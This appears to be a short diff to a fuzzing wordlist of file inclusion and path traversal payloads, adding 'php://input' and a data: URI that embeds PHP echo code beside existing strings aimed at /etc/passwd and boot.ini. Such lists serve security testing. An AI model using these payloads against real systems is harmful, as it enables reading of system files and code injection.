@@ -27,3 +27,5 @@ c:/../../../boot.ini
 ../../etc/passwd
 /../../etc/passwd
 /etc/passwd/./././
+php://input
+data:,<? echo "yay"; ?>
